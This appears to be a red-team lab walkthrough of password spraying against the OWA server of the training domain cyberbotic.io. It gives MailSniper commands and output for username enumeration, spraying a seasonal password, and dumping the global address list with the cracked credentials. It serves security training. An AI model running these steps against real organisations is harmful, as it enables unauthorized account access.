---
description: 09/01/2025
---

# Password Spraying

## What is it?

This is a type of brute force attack that attempts to gain unauthorized access to multiple user accounts by trying a small list of common passwords. These passwords are usually passwords that users are notorious for using.

{% hint style="info" %}
Be careful when utilizing this tactic as you can cause lockouts to local accounts.
{% endhint %}

## Localizations (e.g. Autumn vs. Fall)

Password spraying is an effective technique for discovering weak passwords that users are notorious for using. These are what users use and cycle between password updates depending on domain user policy. For example possible common user passwords could be MonthYear (`August2025`) or SeasonYear (`Summer2016`).

## Tooling, Tactics, Techniques, and Procedures (TTPs)

Two excellent tools for password spraying against Office 365 and Exchange are [`MailSniper`](https://github.com/dafthack/MailSniper) and [`SprayingToolkit`](https://github.com/dafthack/MailSniper).&#x20;

### MailSniper

**In order to begin a Password Spray via `MailSniper`, we must first invoke it:**

```
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

{% hint style="info" %}
Microsoft Defender Real Time protection must be disabled natively without modification to this script if you want it to run correctly.
{% endhint %}

### Enumerate NetBIOS Names of Target Domain

Remember, from external reconnaissance, we were able to obtain this information on the mail server (`mail.cyberbotic.io`).&#x20;

* This is important as we will use it to further enumerate additional information required to gain initial access to our target AD environment

**We can achieve this via `Invoke-DomainHarvestOWA`:**

```
Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io

[*] Harvesting domain name from the server at mail.cyberbotic.io
The domain appears to be: CYBER or cyberbotic.io
```

### Finding Valid Usernames from List of Users Enumerated via External Recon

The following list of users was enumerated from `https://cyberbotic.io`.

**Here are the following enumerated names:**

```
Bob Farmer
Isabel Yates
John King
Joyce Adams
```

We can also pair this effort with [`namemash.py`](https://gist.github.com/superkojiman/11076951), which is a Python script that takes a person's full names and transforms it into possible username permutations (e.g. FirstLast, firstLast, First.Last, etc.).

**We can do this by:**

```
/namemash.py names.txt > possible-names.txt
```

Our new file, `possible-names.txt`, now contains all possible username permutations of our users within `names.txt`.

**Use `head` to view the first few:**

```
head -n 5 possible-names.txt
```

<figure><img src="../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
:bulb: Note: We could potentially skip this step if we knew the email address format from somewhere like hunter.io.
{% endhint %}

### `Invoke-UsernameHarvestOWA` Usage

This module/PS script utilizes a timing attack to validate which (if any) of these usernames are valid.&#x20;

**Switch back to your PowerShell session for this:**

{% code overflow="wrap" %}
```
Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
```
{% endcode %}

**Output:**

```
[*] Now spraying the OWA portal at https://10.10.15.100/owa/
Determining baseline response time...
Response Time (MS)       Domain\Username
763                      cyberbotic.io\OkAJfr
738                      cyberbotic.io\UGVuQv
750                      cyberbotic.io\ztHyFf
749                      cyberbotic.io\dsLWDY
762                      cyberbotic.io\YgFBIP

         Baseline Response: 752.4

Threshold: 460.44
Response Time (MS)       Domain\Username
[*] Potentially Valid! User:cyberbotic.io\bfarmer
[*] Potentially Valid! User:cyberbotic.io\iyates
[*] Potentially Valid! User:cyberbotic.io\jking
[*] A total of 3 potentially valid usernames found.
Results have been written to .\Desktop\valid.txt.
```

### Password Spraying w/ `MailSniper`

`MailSniper` can spray passwords against the valid account(s) identified using Outlook Web Access (OWA), Exchange Web Services (EWS), and Exchange ActiveSync (EAS).

**Password Spray:**

{% code overflow="wrap" %}
```
Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
```
{% endcode %}

**Awesome, we can see that we do indeed have a user identified to be using a localization-based, weak password:**

<figure><img src="../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

The user's credentials successfully obtained via `MailSniper` **Password Spraying**:

```
iyates:Summer2022
```

{% hint style="info" %}
:warning: Remember, this should not be performed in the real world. Too many authentication attempts can count towards the domain lockout policy and lock out the user account. This is often a bad thing to do in engagements and is often out of scope unless mentioned otherwise.
{% endhint %}

### Using `MailSniper` w/ Valid Credentials to Download Global Address List

**Now that we have valid creds, we can authenticate to the target mail server of domain we are targeting and obtain the rest of the emails within the domain:**

{% code overflow="wrap" %}
```
Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

**Email Addresses obtained:**

```
Administrator@cyberbotic.io
bfarmer@cyberbotic.io
iyates@cyberbotic.io
jking@cyberbotic.io
nglover@cyberbotic.io
nlamb@cyberbotic.io
iyates@cyberbotic.io
```

Now that we have more names, we can go back and do another round of spraying against them if desired (_<mark style="color:yellow;">**ESPECIALLY if they weren't found during our initial recon phase**</mark>_).

## Confirming Impact of Weak Password

With successful authentication, proven with `MailSniper`, we can now authenticate as user, `iyates@cyberbotic.io:Summer2022` on the Microsoft Outlook portal.

<figure><img src="../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>
